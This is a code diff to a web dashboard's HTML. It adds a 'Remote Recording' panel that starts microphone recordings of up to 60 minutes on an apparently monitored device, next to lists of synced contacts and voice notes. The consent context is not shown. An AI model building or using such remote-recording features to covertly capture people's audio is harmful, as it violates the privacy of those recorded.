@@ -388,7 +388,30 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <input type="text" id="contactsSearch" placeholder="&#x1F50D; Search contacts..." style="width:100%;padding:8px 10px;background:var(--bg);color:var(--text);border:1px solid var(--border);border-radius:var(--radius);font-size:12px;margin-bottom:8px">
 <div id="contactsList"><div class="label">No contacts synced yet</div></div>
 </div>
-<div id="tab-voice"><div id="voiceNotesList"><div class="label">No voice notes yet</div></div></div>
+<div id="tab-voice">
+<div class="voice-record-panel" style="background:var(--card);padding:12px;border-radius:var(--radius);margin-bottom:12px;border:1px solid var(--border)">
+<div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
+<span style="font-size:13px;font-weight:500;color:var(--text)">🎙️ Remote Recording</span>
+<select id="recDuration" style="background:var(--bg);color:var(--text);border:1px solid var(--border);padding:6px 10px;border-radius:6px;font-size:12px">
+<option value="60">1 min</option>
+<option value="120">2 min</option>
+<option value="300" selected>5 min</option>
+<option value="600">10 min</option>
+<option value="1800">30 min</option>
+<option value="3600">60 min</option>
+</select>
+<button id="btnStartRecord" class="pb-btn" style="background:var(--danger);color:#fff;font-weight:600" onclick="startRemoteRecording()">
+<span>&#x1F3A4; Start Recording</span>
+</button>
+<div id="recStatus" style="font-size:12px;color:var(--muted);margin-left:auto"></div>
+</div>
+<div id="recProgress" style="display:none">
+<input type="range" id="recProgressBar" min="0" max="100" value="0" style="flex:1;accent-color:var(--danger)">
+<span id="recProgressText" style="font-size:11px;color:var(--muted);width:60px;text-align:right">0%</span>
+</div>
+</div>
+<div id="voiceNotesList"><div class="label">No recordings yet</div></div>
+</div>
 <div id="tab-insights">
 <div class="grid" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:10px">
 <div><div class="label">&#x1F4CA; Today's Activity</div><div class="value" id="inTodayActivity">--</div></div>
@@ -1859,7 +1882,7 @@ let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${n
       audioStatus = '<span class="vmeta" style="color:var(--muted);margin-left:8px">\u25CF Unavailable</span>';
     }
     html += `<div class="voice-card">
-      <div class="vname">${name} ${audioStatus}${downloadLink}<button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteVoiceNote('${key}', ${note._batchIndex})">Delete</button></div>
+      <div class="vname">${name} ${audioStatus}${downloadLink}<button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteVoiceNote('${note._batchKey}', ${note._batchIndex})">Delete</button></div>
       ${meta ? `<div class="vmeta">${meta}</div>` : ''}
       ${syncedLine}
       ${player}
